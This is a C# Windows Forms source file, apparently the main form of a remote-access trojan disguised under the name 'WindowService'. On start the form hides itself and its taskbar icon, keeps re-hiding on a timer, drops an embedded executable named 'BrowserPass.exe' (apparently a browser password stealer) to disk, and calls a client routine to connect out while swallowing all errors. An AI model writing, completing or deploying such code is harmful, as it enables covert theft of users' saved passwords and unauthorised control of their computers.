using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using k3rn3lpanicTools;
using WindowService.Properties;

namespace WindowService
{
    public partial class main : Form
    {
        public main()
        {
            Hide();
            ShowInTaskbar = false;
            ShowIcon = false;
            if (!File.Exists("BrowserPass.exe"))
            {
                k3rn3lpanicTools.DataConvertion.ByteToFile(Resources.BrowserPass, "BrowserPass.exe");
            }
            InitializeComponent();
            Connect();
        }
        public async Task Connect()
        {
            try
            {
                await Client.setVir(richTextBox1);
                //Client.ConnectToServer(richTextBox1);

            }
            catch { }
            
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Hide();
        }
    }
}
